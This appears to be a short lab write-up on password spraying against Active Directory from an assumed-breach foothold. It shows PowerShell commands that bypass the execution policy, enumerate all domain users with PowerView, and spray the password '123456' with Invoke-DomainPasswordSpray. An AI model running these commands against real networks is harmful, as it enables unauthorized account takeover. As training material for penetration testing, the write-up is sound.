
### Password Spraying
- An Attack where we try to authenticate with curated list of passwords that are either frequently used of likely to be used by their target.
- Password spraying can be conducted against internet facing system or after gaining a foothold within the network and is seeking to widen their access. 
- Frequent targets for password spraying includes VPN servers, web based email applications and single sign on providers. 
- Trying passwords against as many users as possible.


### Practical:

##### Scenario
We are operating under assume breached. It means we have already accessed to a system, and we have to perform the following tasks. 

1. Identify all the users in the domain
2. Initiate the password spraying attack
3. Execution and verification of the password spraying attack



##### Bypassing the Powershell execution policy

```powershell
powershell -ep bypass
```

##### Loading and Running Powerview

```powershell
. .\powerview.ps1
```

Saved all the users in the file. 
```powershell
Get-DomainUser | Select-Object -ExpandProperty cn | Out-File user.txt
```


##### Password Spraying with `DomainPasswordSpray.ps1`

Loaded the `DomainPasswordSpray.ps1`

```
. .\DomainPasswordSpray.ps1 
```

```
Invoke-DomainPasswordSpray -UserList .\user.txt -Password 123456 -Verbose
```

Followed by yes. 


